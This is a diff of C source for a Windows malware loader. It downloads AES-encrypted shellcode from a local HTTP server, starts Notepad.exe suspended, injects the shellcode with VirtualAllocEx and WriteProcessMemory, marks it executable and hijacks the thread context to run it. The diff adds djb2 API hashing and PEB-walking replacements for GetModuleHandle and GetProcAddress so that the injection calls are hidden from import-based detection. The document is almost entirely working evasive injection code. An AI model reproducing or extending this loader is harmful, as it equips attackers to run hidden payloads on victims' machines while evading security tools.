@@ -3,8 +3,20 @@
 #include <string.h>
 #include <wininet.h>
 #include "aes.h"
+#include <winternl.h>
+
+#define HASH_KERNEL32_DLL          0x6A4ABC5B
+#define HASH_CreateProcessA        0xAEB52E19
+#define HASH_VirtualAllocEx        0xF36E5AB4
+#define HASH_WriteProcessMemory    0x6F22E8C8
+#define HASH_VirtualProtectEx      0xD812922A
+#define HASH_GetThreadContext      0xEBA2CFC2
+#define HASH_SetThreadContext      0x7E20964E
+
+
 
 // import wininet.lib
+
 #pragma comment (lib, "Wininet.lib")
 #define PAYLOAD L"http://192.168.13.1:8000/encrypted_shellcode.bin"
 #define TARGET_PROCESS "Notepad.exe"
@@ -15,41 +27,171 @@
 //#define DEBUG
 
 
-// payload inside of encrypted_shellcode
-// unsigned char encrypted_payload[] = {
-//	0xA9, 0x78, 0xC4, 0xBB, 0x6F, 0x5A, 0x8C, 0x54, 0xCE, 0x6D, 0x63, 0x47, 0xFE, 0xBB, 0x3D, 0x04,
-//	0x19, 0xE1, 0x99, 0x55, 0x45, 0xF5, 0xE1, 0x96, 0xAD, 0x4C, 0xB8, 0x56, 0x87, 0x36, 0x09, 0xC7,
-//	0xD7, 0x3C, 0x3B, 0x52, 0xCC, 0xAD, 0x3C, 0x0F, 0x8D, 0xAA, 0xB8, 0xFB, 0xDA, 0x5D, 0xA3, 0xE9,
-//	0xB0, 0x01, 0x99, 0x81, 0xEF, 0x95, 0x86, 0xD9, 0x76, 0xB4, 0xA0, 0x08, 0x2E, 0x47, 0xC0, 0xD6,
-//	0xE9, 0x8A, 0x9F, 0x29, 0x07, 0x35, 0x71, 0xBC, 0xA0, 0x5F, 0x9B, 0x69, 0x52, 0x43, 0x40, 0x4D,
-//	0x35, 0x5B, 0x41, 0x08, 0x11, 0x47, 0x6D, 0xC7, 0x01, 0xB3, 0xF1, 0xB3, 0xB7, 0x88, 0x0D, 0xC6,
-//	0x65, 0x84, 0x0C, 0x1F, 0xD6, 0x93, 0x4C, 0xB4, 0x59, 0x67, 0x8E, 0xBC, 0x67, 0x73, 0xD9, 0xE7,
-//	0xBA, 0xD0, 0x55, 0xB2, 0xD4, 0x5D, 0xE0, 0x51, 0x70, 0xBF, 0x7F, 0x8A, 0x42, 0xE0, 0x9A, 0x69,
-//	0xC4, 0xF8, 0x98, 0x6A, 0x36, 0xA5, 0x78, 0xDE, 0xD8, 0xD7, 0xCA, 0x63, 0x84, 0xBF, 0xC0, 0x0B,
-//	0x6C, 0x5B, 0x44, 0x1B, 0x13, 0x7D, 0x91, 0x19, 0xE4, 0x9B, 0x05, 0xA1, 0xBE, 0xA9, 0xEF, 0x77,
-//	0xF9, 0xE4, 0x20, 0x47, 0x18, 0xFD, 0xD4, 0x64, 0x1C, 0x30, 0xAD, 0xFE, 0xE8, 0x85, 0xD1, 0x39,
-//	0x6C, 0xBA, 0x54, 0x2E, 0x98, 0x9D, 0x9C, 0xB9, 0xDB, 0x67, 0x49, 0xBD, 0x1E, 0x0F, 0x87, 0x7E,
-//	0x66, 0x18, 0x8D, 0x39, 0xBA, 0x65, 0xE2, 0x46, 0x49, 0x73, 0x73, 0xA5, 0xBA, 0x59, 0x1C, 0x99,
-//  0xA9, 0x6D, 0x8F, 0x68, 0x80, 0x23, 0x5C, 0x65, 0x92, 0x61, 0xFE, 0x1A, 0xE1, 0xE3, 0xB8, 0x7D,
-//  0x53, 0xA0, 0xD2, 0x9B, 0xD7, 0x4F, 0xF3, 0xF1, 0x6F, 0xDB, 0x4B, 0x98, 0x57, 0x6C, 0x68, 0x45,
-//  0x65, 0xCA, 0x7A, 0xF4, 0xD3, 0xCC, 0x76, 0x24, 0xFA, 0x60, 0xE0, 0x3D, 0xD7, 0xBD, 0x10, 0x02,
-//  0xDC, 0x6D, 0x6D, 0xDB, 0x3D, 0x0F, 0x62, 0xF3, 0x51, 0xD1, 0x71, 0x32, 0x40, 0x01, 0xD7, 0x3C,
-//  0x06, 0x1D, 0x58, 0x7B, 0x5B, 0xC3, 0xE4, 0xC0, 0xBF, 0x19, 0xC5, 0xF5, 0xA7, 0xC2, 0x47, 0xED,
-//  0x89, 0xA7, 0x55, 0x5C, 0xCC, 0xE7, 0xDA, 0xAC, 0xA0, 0x58, 0x51, 0xB6, 0x07, 0xF8, 0xBB, 0x2F,
-//  0x4A, 0x2E, 0x80, 0x11, 0xFE, 0x61, 0x03, 0x4C, 0x3D, 0xAD, 0x73, 0xA2, 0x6A, 0x8B, 0xC9, 0x36,
-//  0xF1, 0x18, 0xB4, 0x1C, 0xB0, 0xBA, 0x16, 0x3F, 0x93, 0x0A, 0xD8, 0x64, 0xC2, 0x27, 0x99, 0xC0,
-//  0x8D, 0xDC, 0x4E, 0xD9, 0x39, 0xAD, 0x26, 0xF4, 0x67, 0x96, 0x87, 0x48, 0xB9, 0xFA, 0xEE, 0x86,
-//  0xC5, 0xB9, 0x96, 0xF6, 0xF2, 0x60, 0x31, 0xDF, 0x4B, 0x35, 0x9D, 0x68, 0xD3, 0x3E, 0x79, 0x4D,
-//  0xFB, 0x5F, 0x42, 0xE2, 0x2D, 0x6E, 0xC6, 0xB6, 0xE3, 0xB0, 0x6A, 0x7D, 0xE9, 0x29, 0xDA, 0xD4,
-//  0x1C, 0x6F, 0x8D, 0x1D, 0x10, 0x51, 0x01, 0xBC, 0x35, 0x06, 0x5A, 0x89, 0xA8, 0xEC, 0xB6, 0xB9,
-//  0xB8, 0x8A, 0x43, 0xA8, 0x68, 0xDF, 0x1F, 0x7C, 0x59, 0xA0, 0x4C, 0x57, 0x42, 0xB8, 0x92, 0x82,
-//  0xA6, 0x00, 0x7A, 0xF6, 0x99, 0x80, 0xFF, 0x7E, 0x03, 0x8C, 0x87, 0x50, 0x9B, 0x73, 0x79, 0x32,
-//  0x60, 0x7D, 0xA9, 0xBD, 0xBA, 0xDE, 0x5F, 0x54, 0xF3, 0x1B, 0x7C, 0xE2, 0x47, 0x7E, 0x58, 0xDC,
-//  0xF2, 0x5C, 0xAE, 0x9E, 0x1C, 0x00, 0x64, 0xFA, 0x02, 0x76, 0x7E, 0x3D, 0x8D, 0x10, 0xD4, 0x35 };
+// defining the API that we want to import using custom GetModuleHandle and GetProcAddress on runtime
+
+typedef BOOL (WINAPI* fnCreateProcessA)(
+    IN LPCSTR lpApplicationName,
+    IN LPSTR lpCommandLine,
+    IN LPSECURITY_ATTRIBUTES lpProcessAttributes,
+    IN LPSECURITY_ATTRIBUTES lpThreadAttributes,
+    IN BOOL bInheritHandles,
+    IN DWORD dwCreationFlags,
+    IN LPVOID lpEnvironment,
+    IN LPCSTR lpCurrentDirectory,
+    IN LPSTARTUPINFOA lpStartupInfo,
+    OUT LPPROCESS_INFORMATION lpProcessInformation
+);
+
+typedef LPVOID (WINAPI* fnVirtualAllocEx)(
+    IN HANDLE hProcess,
+    IN LPVOID lpAddress,
+    IN SIZE_T dwSize,
+    IN DWORD flAllocationType,
+    IN DWORD flProtect
+);
+
+typedef BOOL (WINAPI* fnWriteProcessMemory)(
+    IN HANDLE hProcess,
+    IN LPVOID lpBaseAddress,
+    IN LPCVOID lpBuffer,
+    IN SIZE_T nSize,
+    OUT SIZE_T* lpNumberOfBytesWritten
+);
+
+typedef BOOL (WINAPI* fnVirtualProtectEx)(
+    IN HANDLE hProcess,
+    IN LPVOID lpAddress,
+    IN SIZE_T dwSize,
+    IN DWORD flNewProtect,
+    OUT PDWORD lpflOldProtect
+);
+
+typedef BOOL (WINAPI* fnGetThreadContext)(
+    IN HANDLE hThread,
+    IN OUT LPCONTEXT lpContext
+);
+
+typedef BOOL (WINAPI* fnSetThreadContext)(
+    IN HANDLE hThread,
+    IN CONST CONTEXT* lpContext
+);
+
+
+
+DWORD HashStringDjb2A(_In_ PWCHAR String)
+{
+	ULONG Hash = 5381;
+	INT c = 0;
+
+	while (c = *String++)
+		Hash = ((Hash << 5) + Hash) + c;
+
+	return Hash;
+}
+
+
+HMODULE GetModuleHandleReplacement(IN DWORD dwDjb2aHash) {
+
+#ifdef _WIN64
+	PPEB					pPeb				= (PEB*)(__readgsqword(0x60));
+#elif _WIN32
+	PPEB					pPeb				= (PEB*)(__readfsdword(0x30));
+#endif
+
+	PLDR_DATA_TABLE_ENTRY	pDte				= (PLDR_DATA_TABLE_ENTRY)(pPeb->Ldr->InMemoryOrderModuleList.Flink);
+
+	// getting the head of the linked list ( used to get the node & to check the end of the list)
+	PLIST_ENTRY				pListHead			= (PLIST_ENTRY)&pPeb->Ldr->InMemoryOrderModuleList;
+	// getting the node of the linked list
+	PLIST_ENTRY				pListNode			= (PLIST_ENTRY)pListHead->Flink;
+
+	do
+	{
+		if (pDte->FullDllName.Length != NULL) {
+			if (HashStringDjb2A(pDte->FullDllName.Buffer) == dwDjb2aHash) {
+#ifdef DEBUG
+			wprintf(L"[+] Found Dll \"%s\" \n", pDte->FullDllName.Buffer);
+#endif
+			// return the found DLL 
+				return (HMODULE)pDte->Reserved2[0];
+			}
+
+#ifdef DEBUG
+			printf(L"[i] \"%s\" \n", pDte->FullDllName.Buffer);
+#endif
+			// updating pDte to point to the next PLDR_DATA_TABLE_ENTRY in the linked list
+			pDte = (PLDR_DATA_TABLE_ENTRY)(pListNode->Flink);
+
+			// updating the node variable to be the next node in the linked list
+			pListNode = (PLIST_ENTRY)pListNode->Flink;
+
+		}
+
+	// when the node is equal to the head, we reached the end of the linked list, so we break out of the loop
+	} while (pListNode != pListHead);
+
+
+
+	return NULL;
+}
+
+
+FARPROC GetProcAddressCustom(IN HMODULE hModule, IN DWORD lpApiHash) {
+
+	// We do this to avoid casting at each time we use 'hModule'
+	PBYTE pBase = (PBYTE)hModule;
+
+	// Getting the dos header and doing a signature check
+	PIMAGE_DOS_HEADER	pImgDosHdr		= (PIMAGE_DOS_HEADER)pBase;
+	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
+		return NULL;
+
+	// Getting the nt headers and doing a signature check
+	PIMAGE_NT_HEADERS	pImgNtHdrs		= (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
+	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
+		return NULL;
+
+	// Getting the optional header
+	IMAGE_OPTIONAL_HEADER	ImgOptHdr	= pImgNtHdrs->OptionalHeader;
+
+	// Getting the image export table
+	PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY) (pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+
+	// Getting the function's names array pointer
+	PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
+
+	// Getting the function's addresses array pointer
+	PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
+
+	// Getting the function's ordinal array pointer
+	PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);
+
+
+	// Looping through all the exported functions
+	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++){
+
+		// Getting the name of the function
+		WCHAR* pFunctionName = (WCHAR*)(pBase + FunctionNameArray[i]);
+
+		// Getting the address of the function through its ordinal
+		PVOID pFunctionAddress	= (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);
+
+		// Searching for the function specified
+		if (HashStringDjb2A(pFunctionName) == lpApiHash){
+			#ifdef DEBUG
+			printf("[ %0.4d ] FOUND API -\t NAME: %s -\t ADDRESS: 0x%p  -\t ORDINAL: %d\n", i, pFunctionName, pFunctionAddress, FunctionOrdinalArray[i]);
+			#endif
+			return pFunctionAddress;
+		}
+	}
+
+	return NULL;
+}
+
+
 
 
 BOOL GetPayload(LPCWSTR srcurl, PBYTE* sPayloadBytes, size_t* sPayloadSize) {
-
 
     PBYTE pTmpBytes = NULL;
 
@@ -172,6 +314,9 @@ BOOL DecryptAES(IN PBYTE pCipherTextBuffer, IN SIZE_T sCipherTextSize, IN PBYTE 
 }
 
 BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread ) {
+
+    fnCreateProcessA pCreateProcessA = GetProcAddressCustom(GetModuleHandleReplacement(HASH_KERNEL32_DLL), HASH_CreateProcessA);
+
     CHAR lpPath [MAX_PATH * 2];
     CHAR WinDirectory [MAX_PATH];
 
@@ -208,7 +353,7 @@ BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT
     #ifdef DEBUG
     printf("[i] Running : \"%s\" ... ", lpPath);
     #endif
-    if (!CreateProcessA(
+    if (!pCreateProcessA(
         NULL, // not needed
         lpPath, // full path of the executable
         NULL, // not needed
@@ -245,10 +390,17 @@ BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT
 }
 
 BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* pShellcodeAddress) {
+
+    fnVirtualAllocEx pVirtualAllocEx = GetProcAddressCustom(GetModuleHandleReplacement(HASH_KERNEL32_DLL), HASH_VirtualAllocEx);
+
+    fnWriteProcessMemory pWriteProcessMemory = GetProcAddressCustom(GetModuleHandleReplacement(HASH_KERNEL32_DLL), HASH_WriteProcessMemory);
+
+    fnVirtualProtectEx pVirtualProtectEx = GetProcAddressCustom(GetModuleHandleReplacement(HASH_KERNEL32_DLL), HASH_VirtualProtectEx);
+
     SIZE_T lpNumberOfBytesWritten = 0;
     DWORD dwOldProtection = 0;
 
-    *pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // allocate memory the size of the shellcode inside of the remote process
+    *pShellcodeAddress = pVirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // allocate memory the size of the shellcode inside of the remote process
 
     if (*pShellcodeAddress == NULL) {
         #ifdef DEBUG
@@ -260,7 +412,7 @@ BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN 
     #ifdef DEBUG
     printf("\n[!] pShellcodeAddress allocated at 0x%p of Size %d\n", *pShellcodeAddress, sSizeOfShellcode);
     #endif
-    if (!WriteProcessMemory(hProcess, *pShellcodeAddress, pShellcode, sSizeOfShellcode, &lpNumberOfBytesWritten) || lpNumberOfBytesWritten != sSizeOfShellcode) {
+    if (!pWriteProcessMemory(hProcess, *pShellcodeAddress, pShellcode, sSizeOfShellcode, &lpNumberOfBytesWritten) || lpNumberOfBytesWritten != sSizeOfShellcode) {
         #ifdef DEBUG
         printf("[!] WriteProcessMemory failed with error : %d\n", GetLastError());
         #endif
@@ -269,7 +421,7 @@ BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN 
 
     memset(pShellcode, '\0', sSizeOfShellcode);
 
-    if (!VirtualProtectEx(hProcess, *pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
+    if (!pVirtualProtectEx(hProcess, *pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
         printf("[!] VirtualProtect failed with error : %d\n", GetLastError());
         return FALSE;
     }
@@ -278,12 +430,19 @@ BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN 
 }
 
 BOOL HijackThreadExecution(HANDLE hThread, IN PVOID pAddress) {
+
+    fnGetThreadContext pGetThreadContext =
+        GetProcAddressCustom(GetModuleHandleReplacement(HASH_KERNEL32_DLL), HASH_GetThreadContext);
+
+    fnSetThreadContext pSetThreadContext =
+        GetProcAddressCustom(GetModuleHandleReplacement(HASH_KERNEL32_DLL), HASH_SetThreadContext);
+
     CONTEXT ThreadContext = {
         .ContextFlags =  CONTEXT_CONTROL
     };
 
     // Get thread information
-    if (!GetThreadContext(hThread, &ThreadContext)) {
+    if (!pGetThreadContext(hThread, &ThreadContext)) {
         #ifdef DEBUG
         printf("[!] GetThreadContext failed with error: %d\n", GetLastError());
         #endif
@@ -293,7 +452,7 @@ BOOL HijackThreadExecution(HANDLE hThread, IN PVOID pAddress) {
     ThreadContext.Rip = pAddress;
 
     // Write thread
-    if (!SetThreadContext(hThread, &ThreadContext)) {
+    if (!pSetThreadContext(hThread, &ThreadContext)) {
         #ifdef DEBUG
         printf("[!] SetThreadContext failed with error: %d\n", GetLastError());
         #endif
